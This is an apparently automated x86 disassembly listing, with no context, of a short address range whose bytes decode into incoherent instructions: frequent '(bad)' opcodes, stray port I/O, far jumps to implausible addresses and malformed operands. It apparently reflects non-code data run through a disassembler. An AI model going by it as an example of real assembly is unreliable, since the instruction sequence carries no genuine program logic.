  4273e2:	out    dx,eax
  4273e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4273e4:	sbb    BYTE PTR es:[ebx-0x1542b4ef],ch
  4273eb:	mov    esi,0x7a0abab2
  4273f0:	sbb    al,0x49
  4273f2:	xor    edx,esi
  4273f4:	adc    cl,BYTE PTR [edx+0x25e6bb02]
  4273fa:	mov    ds,WORD PTR [esi]
  4273fc:	mov    esp,0xb50e9286
  427401:	aad    0x32
  427403:	repnz add al,0x86
  427406:	stos   BYTE PTR es:[edi],al
  427407:	mov    al,ds:0x28ab1535
  42740c:	cmp    dl,dh
  42740e:	push   0x64c8b11f
  427413:	jo     0x4273af
  427415:	push   es
  427416:	sbb    edx,edx
  427418:	scas   eax,DWORD PTR es:[edi]
  427419:	icebp  
  42741a:	mov    ch,BYTE PTR [edi-0x55515e3]
  427420:	mov    esp,0xb93b1b26
  427425:	and    bh,BYTE PTR [ebp-0x63]
  427428:	out    0x28,al
  42742a:	(bad)  
  42742b:	pop    ebp
  42742c:	(bad)  
  42742d:	mov    ch,BYTE PTR [ebx+esi*4+0x7a]
  427431:	or     esi,ecx
  427433:	cmp    DWORD PTR [ecx+0x76f44eae],edx
  427439:	xor    DWORD PTR [esi-0x27154a66],0x3c
  427440:	adc    bl,dl
  427442:	xchg   edi,eax
  427443:	inc    ebx
  427444:	jp     0x4274a8
  427446:	sub    ecx,DWORD PTR [ebp+0x2f]
  427449:	pop    ebx
  42744a:	lods   al,BYTE PTR ds:[esi]
  42744b:	or     DWORD PTR [edi+0x332f04c4],0x67
  427452:	pop    ebx
  427453:	fwait
  427454:	std    
  427455:	aas    
  427456:	jmp    0x4274b7
  427458:	cdq    
  427459:	ror    eax,0x48
  42745c:	(bad)  
  42745d:	jno    0x4274d2
  42745f:	outs   dx,BYTE PTR ds:[esi]
  427460:	mov    ah,0xd2
  427462:	cdq    
  427463:	or     bl,al
  427465:	cmp    dh,BYTE PTR [edi]
  427467:	fwait
  427468:	sbb    al,dh
  42746a:	pushw  ds
  42746c:	xchg   bx,ax
  42746e:	add    BYTE PTR ds:[eax],al
	...
  427479:	add    BYTE PTR [eax+0x23],ch
  42747c:	sub    eax,0x7b1e6f1e
  427481:	ja     0x4274f2
  427483:	jno    0x4274a3
  427485:	dec    esi
  427486:	(bad)  
  427487:	push   ds
  427488:	cwde   
  427489:	lea    ebp,[edx+ebp*8+0x1]
  42748d:	add    ch,bh
  42748f:	add    DWORD PTR [eax],eax
  427491:	add    BYTE PTR ds:0x2880c764,bl
  427497:	ds push ecx
  427499:	sbb    ebp,DWORD PTR [ecx-0x62d16e]
  42749f:	scas   al,BYTE PTR es:[edi]
  4274a0:	leave  
  4274a1:	xchg   edi,eax
  4274a2:	push   ebx
  4274a3:	dec    edi
  4274a4:	(bad)  
  4274a6:	sub    al,0x53
  4274a8:	fwait
  4274a9:	adc    eax,0xe54f110
  4274ae:	push   cs
  4274af:	shl    BYTE PTR ss:[esi+ebp*2-0x63],1
  4274b4:	stos   DWORD PTR es:[edi],eax
  4274b5:	pop    edi
  4274b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4274b7:	pushf  
  4274b8:	sahf   
  4274b9:	jmp    0x9674ff6c
  4274be:	jae    0x42750c
  4274c0:	mov    esp,0x9f45892f
  4274c5:	in     eax,0x45
  4274c7:	shl    BYTE PTR [ebx+edx*1],0xb
  4274cb:	int3   
  4274cc:	cld    
  4274cd:	mov    esi,0xab1d258c
  4274d2:	sbb    dl,BYTE PTR [ecx]
  4274d4:	xor    esp,edx
  4274d6:	inc    eax
  4274d7:	xor    al,0x8d
  4274d9:	sbb    eax,0xf0e1f426
  4274de:	(bad)  
  4274df:	dec    ebp
  4274e0:	out    dx,al
  4274e1:	iret   
  4274e2:	ret    
  4274e3:	jbe    0x42750b
  4274e5:	in     eax,dx
  4274e6:	out    0xcb,al
  4274e8:	ret    0xb533
  4274eb:	fldenv [ebx]
  4274ed:	outs   dx,DWORD PTR ds:[esi]
  4274ee:	rol    eax,1
  4274f0:	push   ebp
  4274f2:	or     al,0xff
  4274f4:	jmp    0x966c:0xcad61351
  4274fb:	das    
  4274fc:	out    0xa6,eax
  4274fe:	jo     0x4274fd
  427500:	sbb    eax,0x15d31a6a
  427505:	adc    eax,0x785d0d2
  42750a:	rcl    DWORD PTR [edi],1
  42750c:	dec    edi
  42750d:	mov    ebx,0x4432b2f8
  427512:	jno    0x427507
  427514:	ret    
  427515:	mov    dl,0xa5
  427517:	push   edx
  427518:	xchg   edi,eax
  427519:	(bad)  
  42751a:	in     eax,0x4b
  42751c:	push   0xffffff9c
  42751e:	mov    ah,0x86
  427520:	scas   al,BYTE PTR es:[edi]
  427521:	shl    BYTE PTR [edx],0x68
  427524:	sub    al,BYTE PTR [edi-0x50]
  427527:	or     al,0x2b
  427529:	ins    DWORD PTR es:[edi],dx
  42752a:	and    DWORD PTR ds:0x4fa30e33,ebx
  427530:	dec    ebp
  427531:	punpcklwd mm5,DWORD PTR [esi]
  427534:	sub    DWORD PTR [ebp+0x75],ecx
  427537:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427538:	dec    edx
  427539:	sbb    dh,0x52
  42753c:	adc    BYTE PTR [ebp-0x30d242ec],al
  427542:	stos   DWORD PTR es:[edi],eax
  427543:	fld    QWORD PTR [ebp+0x4692b710]
  427549:	iret   
  42754a:	aas    
  42754b:	jns    0x42750f
  42754d:	pop    ebp
  42754e:	(bad)  
  42754f:	repz adc al,BYTE PTR [ebx+edx*8]
  427553:	xchg   DWORD PTR [ecx-0x43],esi
  427556:	rol    BYTE PTR [esi-0x6c],cl
  427559:	aaa    
  42755a:	cmp    eax,DWORD PTR [edi]
  42755c:	dec    ebp
  42755d:	pop    edi
  42755e:	mov    esp,0x61d4a85a
  427563:	(bad)  
  427564:	in     al,dx
  427565:	ins    BYTE PTR es:[edi],dx
  427566:	sub    esp,DWORD PTR [bp+di+0x29]
  42756a:	mov    cl,0xa1
  42756c:	adc    al,0xed
  42756e:	sub    BYTE PTR [eax-0x4d5072eb],cl
  427574:	pop    ebx
  427575:	leave  
  427576:	out    dx,eax
  427577:	sub    al,0xdf
  427579:	loopne 0x427559
  42757b:	ins    BYTE PTR es:[edi],dx
  42757c:	push   es
  42757d:	out    dx,al
  42757e:	ja     0x427593
  427580:	pusha  
  427581:	jl     0x427531
  427583:	adc    bh,dh
  427585:	xor    BYTE PTR [edx],al
  427587:	loope  0x4275f9
  427589:	into   
  42758a:	or     DWORD PTR [ecx+0x735f734f],ebx
  427590:	mov    esp,0x8180bf52
  427595:	es retf 
  427597:	in     al,0x21
  427599:	rcl    BYTE PTR [eax+0x47],0x6c
  42759d:	add    ebx,DWORD PTR [ecx]
  42759f:	fstp   TBYTE PTR [ebp-0x6d60d319]
  4275a5:	scas   al,BYTE PTR es:[edi]
  4275a6:	mov    ah,0x3d
  4275a8:	or     bh,dh
  4275aa:	mov    eax,0xdfc78b8d
  4275af:	jg     0x4275b3
  4275b1:	nop
  4275b2:	and    DWORD PTR [ebp+0x23],0x2def6e2e
  4275b9:	clc    
  4275ba:	jecxz  0x42753d
  4275bc:	adc    al,0x15
  4275be:	and    al,0xb6
  4275c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275c1:	addr16 and dh,cl
  4275c4:	prefetchw BYTE PTR ds:0x2660d35d
  4275cb:	pop    ds
  4275cc:	bnd jp 0x42686d2b
  4275d3:	dec    edx
  4275d4:	inc    ebx
  4275d5:	ss sub al,0xd3
  4275d8:	je     0x427611
  4275da:	add    BYTE PTR [esi],ch
  4275dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4275dd:	inc    esi
  4275de:	sbb    edi,ebp
  4275e0:	add    BYTE PTR [ebx+0x67694450],al
  4275e6:	fcom   QWORD PTR [edx+0x68aaa544]
  4275ec:	stos   DWORD PTR es:[edi],eax
  4275ed:	mov    al,ds:0xcbf1dc9c
  4275f3:	adc    edi,eax
  4275f5:	xor    edi,ebp
  4275f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275f8:	push   ebx
  4275f9:	retf   
  4275fa:	mov    ds:0xf321cb19,eax
  4275ff:	mov    esp,0xc24c069d
  427604:	or     al,0xae
  427606:	inc    edx
  427607:	retf   
  427608:	(bad)  
  427609:	push   ss
  42760a:	clc    
  42760b:	mov    esp,0x8c1d2819
  427610:	outs   dx,BYTE PTR ds:[esi]
  427611:	ss gs ret 
  427614:	sbb    cl,BYTE PTR [ecx]
  427616:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427617:	inc    ebx
  427618:	aad    0x51
  42761a:	jge    0x4275af
  42761c:	cld    
  42761d:	pop    ds
  42761e:	sbb    dh,BYTE PTR ds:0x47fc652f
  427624:	xchg   esp,eax
  427625:	xor    al,BYTE PTR [ecx+0x17]
  427628:	sub    DWORD PTR [edi+ebp*1+0xa],esi
  42762c:	out    dx,al
  42762d:	mov    DWORD PTR [ebp+0x26dfac2],0xb963c38
  427637:	aam    0x4d
  427639:	call   0x655300a6
  42763e:	lods   al,BYTE PTR ds:[esi]
  42763f:	lods   eax,DWORD PTR ds:[esi]
  427640:	pop    ebp
  427641:	pushf  
  427642:	cmp    BYTE PTR [edx-0x7b9572d3],dl
  427648:	and    al,0xfc
  42764a:	rcl    BYTE PTR [esi+0x1f],0x9c
  42764e:	outs   dx,BYTE PTR ds:[esi]
  42764f:	std    
  427650:	mov    esi,edx
  427652:	mov    ebx,0xa9f8191d
  427657:	xor    BYTE PTR [ebx],0x6a
  42765a:	xchg   esi,eax
  42765b:	inc    edx
  42765c:	adc    cl,BYTE PTR [edi]
  42765e:	xor    al,BYTE PTR [ebx]
  427660:	les    eax,FWORD PTR ds:0xa91309bd
  427666:	sub    al,0x33
  427668:	or     ebp,DWORD PTR [ebx+0x62cf7e4]
  42766e:	mov    dh,0xef
  427670:	mov    ebp,0x4dace1d1
  427675:	push   es
  427676:	popf   
  427677:	jle    0x4276af
  427679:	jl     0x42767a
  42767b:	jbe    0x427636
  42767d:	push   ebp
  42767e:	bnd jg 0x42764a
  427681:	in     al,0xcd
  427683:	call   0xecd33ad5
  427688:	lock adc DWORD PTR [esi-0x16],esp
  42768c:	jl     0x427675
  42768e:	dec    ebx
	...
  427697:	add    BYTE PTR [eax],al
  427699:	add    BYTE PTR [ecx-0x6600738],bl
  42769f:	mov    edi,0xcf7dceff
  4276a4:	stc    
  4276a5:	popf   
  4276a6:	outs   dx,DWORD PTR ds:[esi]
  4276a7:	xchg   edx,eax
  4276a8:	fs in  eax,0x69
  4276ab:	in     al,dx
  4276ac:	add    DWORD PTR [eax],eax
  4276ae:	std    
  4276af:	add    DWORD PTR [eax],eax
  4276b1:	add    al,ah
  4276b3:	jmp    0x8b92:0x6bef2a01
  4276ba:	xchg   ecx,eax
  4276bb:	inc    esp
  4276bc:	fwait
  4276bd:	test   al,0xe8
  4276bf:	ret    
  4276c0:	xchg   esp,eax
  4276c1:	mov    ch,0xac
  4276c3:	lds    edx,FWORD PTR [edi-0x17]
  4276c6:	ror    esi,0xbc
  4276c9:	fild   QWORD PTR [ebp+0x20]
  4276cc:	call   0xad40:0xe1f280c0
  4276d3:	dec    esi
  4276d4:	sbb    al,0xe8
  4276d6:	mov    bl,0x58
  4276d8:	mov    ch,0xeb
  4276da:	ss jecxz 0x427716
  4276dd:	iret   
  4276de:	pop    edx
  4276df:	push   esi
  4276e0:	dec    edi
  4276e1:	mov    dh,BYTE PTR [edx+0x3ed2888b]
  4276e7:	ds popa 
  4276e9:	fs xor eax,0xea12d586
  4276ef:	sbb    BYTE PTR [ecx-0x52c92d1d],0x45
  4276f6:	xchg   edx,eax
  4276f7:	sbb    esp,edx
  4276f9:	arpl   WORD PTR ds:0xa7b662ec,ax
  4276ff:	cmp    eax,0x4061d7c4
  427704:	cmp    edx,DWORD PTR [ebx+0x12]
  427707:	fiadd  WORD PTR ds:0x77f37702
  42770d:	outs   dx,BYTE PTR ds:[esi]
  42770e:	mov    ds:0x2d8fdcd5,al
  427713:	pop    ecx
  427714:	arpl   WORD PTR [eax+0x2d],ax
  427717:	in     eax,0x2d
  427719:	push   cs
  42771a:	mov    BYTE PTR [edx-0x7c2d0ac9],dl
  427720:	and    eax,0x12ef51bc
  427725:	dec    edx
  427726:	pop    ebp
  427727:	add    al,0xc9
  427729:	and    dl,ah
  42772b:	(bad)  
  42772c:	mov    ebx,0x58d37b93
  427731:	rol    ebx,1
  427733:	and    DWORD PTR [ebp+0x54ab7899],esp
  427739:	loopne 0x42777f
  42773b:	cmp    al,0xb2
  42773d:	sbb    al,0x24
  42773f:	mov    dl,0xc7
  427741:	inc    edx
  427742:	in     al,0xff
  427744:	shl    dh,0x6c
  427747:	mov    BYTE PTR [ecx+0x1b],dl
  42774a:	mov    BYTE PTR [ebx-0x40e2a99b],al
  427750:	pushf  
  427751:	push   edx
  427752:	push   edx
  427753:	add    DWORD PTR [ebx],edx
  427755:	test   eax,0xd282df26
  42775a:	sub    al,0x46
  42775c:	mov    eax,ds:0x78edd3fe
  427761:	adc    dh,BYTE PTR [esi]
  427763:	pop    ecx
  427764:	(bad)  
  427765:	leave  
  427766:	xor    al,0x87
  427768:	frstor [esi]
  42776a:	pop    gs
  42776c:	into   
  42776d:	xchg   edi,eax
  42776e:	popf   
  42776f:	and    DWORD PTR [edi],ebp
  427771:	lds    edx,FWORD PTR [ebx+0x3315ad60]
  427777:	sbb    edx,DWORD PTR [edx]
  427779:	xlat   BYTE PTR ds:[ebx]
  42777a:	outs   dx,BYTE PTR ds:[esi]
  42777b:	and    BYTE PTR [edx+0x61],cl
  42777e:	push   ebp
  42777f:	nop
  427780:	dec    eax
  427781:	mov    ?,WORD PTR [edx]
  427783:	cmp    eax,0x591f6b64
  427788:	mov    edi,cs
  42778a:	scas   eax,DWORD PTR es:[edi]
  42778b:	inc    edi
  42778c:	bound  edx,QWORD PTR [eax+edi*4]
  42778f:	scas   eax,DWORD PTR es:[edi]
  427790:	jg     0x4277f4
  427792:	push   edi
  427793:	push   ss
  427794:	xchg   edi,eax
  427795:	imul   eax,esi,0x43053c6a
  42779b:	test   BYTE PTR [edi+ecx*4],bh
  42779e:	enter  0x20,0xdb
  4277a2:	aaa    
  4277a3:	sub    DWORD PTR [eax],edi
  4277a5:	jmp    0x42775d
  4277a7:	push   ds
  4277a8:	mov    DWORD PTR [eax-0x2138b328],eax
  4277ae:	ret    0x820c
  4277b1:	dec    ecx
  4277b2:	fadd   DWORD PTR [edx+0x73792f6]
  4277b8:	xchg   DWORD PTR [ebp-0x69],ecx
  4277bb:	call   0x524b:0xa1cc3a28
  4277c2:	push   ds
  4277c3:	dec    edx
  4277c4:	add    bh,BYTE PTR [ebx+0x10481366]
  4277ca:	cmp    al,0x2
  4277cc:	hlt    
  4277cd:	jo     0x4277fa
  4277cf:	cs ss aas 
  4277d2:	adc    eax,0x7cc6bd72
  4277d7:	pop    eax
  4277d8:	ja     0x42778c
  4277da:	sahf   
  4277db:	xchg   ebp,eax
  4277dc:	push   ds
  4277dd:	xchg   esp,eax
  4277de:	lods   eax,DWORD PTR ds:[esi]
  4277df:	mov    ch,0x49
  4277e1:	ficomp DWORD PTR [esi]
  4277e3:	cmp    al,0xc0
  4277e5:	push   ds
  4277e6:	jge    0x427834
  4277e8:	ret    
  4277e9:	rcr    DWORD PTR [bp+di+0x4a],1
  4277ed:	push   ds
  4277ee:	jmp    0x495309e9
  4277f3:	int3   
  4277f4:	pop    ebp
  4277f5:	push   edi
  4277f6:	sub    DWORD PTR [ecx+0x16],ebx
  4277f9:	add    BYTE PTR [esi],ah
  4277fb:	data16 fisubr WORD PTR [ebx+0xf6fa83e]
  427802:	inc    eax
  427803:	not    DWORD PTR [ebx-0x45]
  427806:	xchg   DWORD PTR [edi],esp
  427808:	jno    0x4277ef
  42780a:	es aas 
  42780c:	mov    bl,0x84
  42780e:	sbb    BYTE PTR [edi-0x2],al
  427811:	test   edi,0x8d23107b
  427817:	call   DWORD PTR [edi+0x696aed90]
  42781d:	or     al,0xf9
  42781f:	cs or  ecx,ebp
  427822:	(bad)  
  427823:	scas   al,BYTE PTR es:[edi]
  427824:	out    dx,al
  427825:	fwait
  427826:	std    
  427827:	xchg   ebx,eax
  427828:	test   al,0x4a
  42782a:	repz dec edi
  42782c:	cli    
  42782d:	ror    DWORD PTR [ecx],1
  42782f:	push   ecx
  427830:	jne    0x4277c6
  427832:	sar    ch,cl
  427834:	pop    DWORD PTR [eax]
  427836:	and    al,0xe2
  427838:	jmp    0xa8c0:0x9c4e8886
  42783f:	addr16 jb 0x42784c
  427842:	jmp    0x99ee3b77
  427847:	in     eax,0xd1
  427849:	popf   
  42784a:	fcom   QWORD PTR ds:0x4072a68a
  427850:	aas    
  427851:	enter  0x6b59,0xe6
  427855:	inc    ecx
  427856:	or     al,BYTE PTR ds:0xbd2a229e
  42785c:	nop
  42785d:	add    ch,BYTE PTR ds:0xbc2c9735
  427863:	xchg   esi,eax
  427864:	dec    ecx
  427865:	js     0x427813
  427867:	adc    eax,DWORD PTR [ebx+0x1709af56]
  42786d:	ret    0xf9da
  427870:	mov    bh,ah
  427872:	int3   
  427873:	loopne 0x427809
  427875:	in     eax,dx
  427876:	and    ebx,DWORD PTR [esi]
  427878:	stos   BYTE PTR es:[edi],al
  427879:	dec    esp
  42787a:	out    0x6e,al
  42787c:	mov    gs,ebp
  42787e:	jo     0x42787c
  427880:	mov    ch,0xe6
  427882:	pop    ss
  427883:	sar    cl,0x47
  427886:	push   0xffffff84
  427888:	inc    ebx
  427889:	xlat   BYTE PTR ds:[ebx]
  42788a:	das    
  42788b:	adc    edi,ebx
  42788d:	jp     0x427895
  42788f:	jmp    0x9f2cbccb
  427894:	jno    0x4278f0
  427896:	adc    edi,DWORD PTR [esi-0x44]
  427899:	mov    ds:0x3da6078,al
  42789e:	dec    eax
  42789f:	dec    ebp
  4278a0:	cmc    
  4278a1:	sub    edx,edi
  4278a3:	iret   
  4278a4:	cmp    eax,0xa666fe44
  4278a9:	shr    BYTE PTR [esi+edi*8+0x33a0ad],cl
	...
  4278b8:	add    BYTE PTR [eax],al
  4278ba:	jns    0x4278c6
  4278bc:	sbb    BYTE PTR gs:[edi+0x7f],dh
  4278c0:	jge    0x42792d
  4278c2:	and    DWORD PTR [ebp+0x30],ecx
  4278c5:	dec    esi
  4278c6:	ds jo  0x427941
  4278c9:	or     ah,BYTE PTR [esi-0x12]
  4278cc:	add    DWORD PTR [eax],eax
  4278ce:	std    
  4278cf:	add    DWORD PTR [eax],eax
  4278d1:	add    dh,dh
  4278d3:	retf   
  4278d4:	pop    ds
  4278d5:	push   ds
  4278d6:	stos   BYTE PTR es:[edi],al
  4278d7:	dec    esp
  4278d8:	popa   
  4278d9:	imul   esp,edx,0xe52dcb42
  4278df:	dec    ebp
  4278e0:	adc    al,0xc2
  4278e2:	cmp    al,0x20
  4278e4:	jnp    0x4278d5
  4278e6:	add    al,0x86
  4278e8:	icebp  
  4278e9:	inc    edi
  4278ea:	push   0x6f
  4278ec:	xchg   ebp,eax
  4278ed:	adc    eax,0x33c6f854
  4278f2:	pop    ecx
  4278f3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4278f4:	iret   
  4278f5:	retf   0x6f99
  4278f8:	cmp    edi,DWORD PTR [eax-0x29]
  4278fb:	xchg   ebp,eax
  4278fc:	mov    ds:0xca78a2bc,al
  427901:	mov    bl,0xf
  427903:	dec    esi
  427904:	push   0x8775fd5
  427909:	pop    ecx
  42790a:	loope  0x42792b
  42790c:	mov    ebp,0x371d3039
  427911:	jp     0x42798a
  427913:	mov    esi,0xd1151b51
  427918:	push   ebp
  427919:	in     eax,dx
  42791a:	dec    eax
  42791b:	mov    ebp,0x7a0bc16f
  427920:	add    DWORD PTR [ebx+ebx*1-0x535e59a2],ecx
  427927:	lods   eax,DWORD PTR ds:[esi]
  427928:	adc    esi,DWORD PTR [edx+0x60]
  42792b:	js     0x42797a
  42792d:	mov    ebp,0xd16b7bc7
  427932:	dec    esp
  427933:	and    BYTE PTR [eax+0xa],cl
  427936:	inc    edx
  427937:	dec    esi
  427939:	dec    edx
  42793a:	cdq    
  42793b:	or     al,BYTE PTR [edx+ebp*2+0x10]
  42793f:	(bad)  
  427940:	int3   
  427941:	arpl   ax,bx
  427943:	and    DWORD PTR [edx-0x7d],ebx
  427946:	ins    BYTE PTR es:[edi],dx
  427947:	dec    esp
  427948:	out    0x6c,al
  42794a:	js     0x4278d6
  42794c:	mov    bl,0xda
  42794e:	mov    dh,0x52
  427950:	jle    0x427927
  427952:	and    al,0x81
  427954:	jns    0x4279a7
  427956:	xor    dh,BYTE PTR [ecx+0x7c]
  427959:	loope  0x42794c
  42795b:	into   
  42795c:	or     dh,BYTE PTR [ebp+ebx*8-0x70]
  427960:	inc    esi
  427961:	fcmovu st,st(4)
  427963:	aaa    
  427964:	push   edi
  427965:	dec    eax
  427966:	lods   eax,DWORD PTR ds:[esi]
  427967:	adc    al,BYTE PTR [edx+eiz*2-0x16]
  42796b:	lods   eax,DWORD PTR ds:[esi]
  42796c:	cli    
  42796d:	frstor [edx+0x52]
  427970:	inc    esp
  427971:	(bad)  
  427972:	jle    0x427962
  427974:	stc    
  427975:	cld    
  427976:	mov    ?,WORD PTR [ecx+0x6b9e03a7]
  42797c:	pop    ebp
  42797d:	cmc    
  42797e:	imul   esi,DWORD PTR ds:0x7439d0b1,0xd0d0b2c2
  427988:	test   DWORD PTR [eax+edi*4],edi
  42798b:	add    eax,0xfb4dfdf0
  427990:	nop
  427991:	ins    BYTE PTR es:[edi],dx
  427992:	push   0xcfcbcb9d
  427997:	xlat   BYTE PTR ds:[bx]
  427999:	mov    ah,bl
  42799b:	loope  0x427a04
  42799d:	jmp    0x4279a8
  42799f:	adc    DWORD PTR [edx-0x3b745fb8],esi
  4279a5:	cli    
  4279a6:	clc    
  4279a7:	add    eax,0x6e1ca8a
  4279ac:	out    0xaa,al
  4279ae:	ja     0x4279c1
  4279b0:	sub    DWORD PTR [eax-0x1b],ebp
  4279b3:	and    al,BYTE PTR [ecx-0x54ffe885]
  4279b9:	cmp    BYTE PTR [esi+edi*1],0x90
  4279bd:	aas    
  4279be:	jg     0x4279a2
  4279c0:	cmp    DWORD PTR [edi],edx
  4279c2:	mov    edi,0x4588ec42
  4279c7:	pushf  
  4279c8:	and    DWORD PTR [ebx],0x263855e7
  4279ce:	inc    esi
  4279cf:	pop    esp
  4279d0:	les    ebx,FWORD PTR [ecx-0x6b]
  4279d3:	nop
  4279d4:	ficomp WORD PTR [ebp+0x63]
  4279d7:	and    edi,DWORD PTR [esi-0x61]
  4279da:	shl    DWORD PTR [esi-0x6ad77bdf],1
  4279e0:	in     al,0x28
  4279e2:	xlat   BYTE PTR ds:[ebx]
  4279e3:	stos   DWORD PTR es:[edi],eax
  4279e4:	jns    0x4279f8
  4279e6:	(bad)  
  4279e7:	dec    ecx
  4279e8:	int3   
  4279e9:	mov    dh,0x53
  4279eb:	adc    BYTE PTR [ecx-0x44],ch
  4279ee:	jns    0x4279a4
  4279f0:	les    esp,FWORD PTR [ecx-0x2859a3be]
  4279f6:	and    eax,0xbf044d39
  4279fb:	es mov esi,0x1d5e2cd5
  427a01:	pop    es
  427a02:	data16 jge 0x4279cf
  427a05:	or     al,0x60
  427a07:	aad    0x8
  427a09:	adc    DWORD PTR [ecx+0x7e57185c],0x51421b54
  427a13:	test   al,0xb5
  427a15:	enter  0x97c2,0xa5
  427a19:	fild   WORD PTR cs:[edi+0x1a]
  427a1d:	mov    eax,DWORD PTR [ebx-0x45bb11]
  427a23:	push   ebp
  427a24:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427a25:	sub    bl,BYTE PTR [eax+0x39e5e32f]
  427a2b:	jmp    0x663de923
  427a30:	jb     0x4279c7
  427a32:	push   0xdea7f053
  427a37:	ins    DWORD PTR es:[edi],dx
  427a38:	mov    edx,DWORD PTR [edi+0x50]
  427a3b:	pop    esi
  427a3c:	arpl   WORD PTR [ebp+0x60],di
  427a3f:	pop    ecx
  427a40:	mov    ecx,0x881a8af7
  427a45:	jo     0x427a64
  427a47:	push   ds
  427a48:	ja     0x427a34
  427a4a:	mov    bl,al
  427a4c:	(bad)
  427a4f:	in     al,0x4b
  427a51:	mov    edi,ebp
  427a53:	sbb    DWORD PTR [edi-0x229c3393],ebx
  427a59:	adc    ah,bl
  427a5b:	jge    0x427a34
  427a5d:	arpl   WORD PTR [ebp-0x65ca1],bp
  427a63:	arpl   WORD PTR ss:[ecx+eax*4+0x45],bx
  427a68:	sbb    eax,0x49909057
  427a6d:	in     eax,0x4d
  427a6f:	out    dx,al
  427a70:	cmp    eax,0x55e4e72b
  427a75:	pop    eax
  427a76:	xchg   BYTE PTR [esi],bh
  427a78:	ins    DWORD PTR es:[edi],dx
  427a79:	iret   
  427a7a:	sub    ebp,DWORD PTR [esi+0x66]
  427a7d:	cmc    
  427a7e:	push   ds
  427a7f:	sbb    esp,DWORD PTR [eax+0x223667]
  427a85:	adc    ch,BYTE PTR [ebx-0x3d]
  427a88:	sub    DWORD PTR [ecx-0x239413ee],ecx
  427a8e:	sbb    BYTE PTR [ebx],al
  427a90:	les    esp,FWORD PTR [edx-0x68bc42ac]
  427a96:	push   ecx
  427a97:	out    0x6e,eax
  427a99:	cmp    ebp,DWORD PTR [edx]
  427a9b:	in     eax,dx
  427a9c:	(bad)  
  427a9d:	cmp    al,0x87
  427a9f:	sbb    ch,BYTE PTR [esi]
  427aa1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427aa2:	bound  ecx,QWORD PTR [eax+0x1e414d7f]
  427aa8:	(bad)  
  427aa9:	repnz xlat BYTE PTR ds:[ebx]
  427aab:	jle    0x427a85
  427aad:	and    BYTE PTR [edi+ebx*1+0x53],0x90
  427ab2:	mov    ebx,0x48213f1e
  427ab7:	daa    
  427ab8:	jnp    0x427b0d
  427aba:	xor    bl,BYTE PTR [eax-0x2b]
  427abd:	push   ecx
  427abe:	push   es
  427abf:	mov    edx,0xf2ab616a
  427ac4:	adc    BYTE PTR [ecx-0x457f0abe],cl
  427aca:	add    ah,BYTE PTR [edx]
  427acc:	xor    BYTE PTR [edi+0x1],bl
	...
  427ad7:	add    BYTE PTR [eax],al
  427ad9:	add    BYTE PTR [ecx+0x3],bl
  427adc:	rol    DWORD PTR [ebx+ebx*8-0x3a],0xdd
  427ae1:	pop    ds
  427ae2:	arpl   WORD PTR [edi+0xa064d6c],di
  427ae8:	jo     0x427a78
  427aea:	arpl   ax,si
  427aec:	add    DWORD PTR [eax],eax
  427aee:	std    
  427aef:	add    DWORD PTR [eax],eax
  427af1:	add    BYTE PTR [ebp+ebx*4+0x1791093f],dl
  427af8:	jmp    0xeb897464
  427afd:	push   0xc8060415
  427b02:	mov    ch,0xe4
  427b04:	icebp  
  427b05:	xchg   edx,eax
  427b06:	lock repnz call 0xd4f4:0xdaedfd3e
  427b0f:	bound  ecx,QWORD PTR [edx+eax*8-0x79]
  427b13:	out    dx,eax
  427b14:	sti    
  427b15:	mov    eax,ds:0x63de46a1
  427b1a:	push   ebx
  427b1b:	sub    edx,esi
  427b1d:	loopne 0x427b40
  427b1f:	mov    bl,0xe
  427b21:	js     0x427b11
  427b23:	rcr    ebx,cl
  427b25:	hlt    
  427b26:	fcom   QWORD PTR es:[ebx-0x74e2bdbe]
  427b2d:	jge    0x15258e87
  427b33:	inc    edx
  427b34:	lea    ecx,[edi+ebx*4]
  427b37:	aad    0x68
  427b39:	imul   esp,DWORD PTR [ecx-0x67],0x3a82a06a
  427b40:	push   ds
  427b41:	or     DWORD PTR [ebx-0x3],0x95b73a38
  427b48:	pushf  
  427b49:	gs test al,0x97
  427b4c:	std    
  427b4d:	(bad)  
  427b4e:	lds    ebx,FWORD PTR [ebp+0x6c]
  427b51:	retf   0x25e
  427b54:	out    dx,eax
  427b55:	ins    DWORD PTR es:[edi],dx
  427b56:	mov    ?,WORD PTR [ebx+ecx*1+0x7c]
  427b5a:	mov    ch,0x27
  427b5c:	sbb    eax,ebp
  427b5e:	inc    esp
  427b5f:	in     al,0x94
  427b61:	cmp    DWORD PTR [ecx-0x10],ebp
  427b64:	mov    ecx,0x531b0fcd
  427b69:	inc    esp
  427b6a:	or     DWORD PTR [ecx+0x11b59b57],ebp
  427b70:	mov    bh,0xcc
  427b72:	mov    bl,0x8a
  427b74:	inc    edi
  427b75:	fistp  QWORD PTR [eax+0x3c]
  427b78:	inc    esp
  427b79:	fld    QWORD PTR [ebp+0x41]
  427b7c:	pop    ebp
  427b7d:	and    DWORD PTR [ebx+0x1e],0x2
  427b81:	xchg   esp,eax
  427b82:	fnsave [di]
  427b85:	fsubp  st(2),st
  427b87:	or     BYTE PTR [eax+eax*4+0x65c44268],0xf2
  427b8f:	lock xchg BYTE PTR [edx],dl
  427b92:	retf   
  427b93:	mov    dh,0x8a
  427b95:	and    eax,0xb1a96167
  427b9a:	or     eax,DWORD PTR ds:[ecx-0x54]
  427b9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427b9f:	sbb    BYTE PTR [ecx+0x75ecafba],al
  427ba5:	es loope 0x427bdc
  427ba8:	sbb    al,0x7b
  427baa:	sub    eax,0xb593e46b
  427baf:	sbb    BYTE PTR [ecx],bh
  427bb1:	out    dx,al
  427bb2:	in     eax,0x53
  427bb4:	cs jae 0x427b75
  427bb7:	fcomp  DWORD PTR ds:0x3f034e0
  427bbd:	inc    esp
  427bbe:	outs   dx,BYTE PTR ds:[esi]
  427bbf:	jno    0x427bac
  427bc1:	inc    ecx
  427bc2:	push   eax
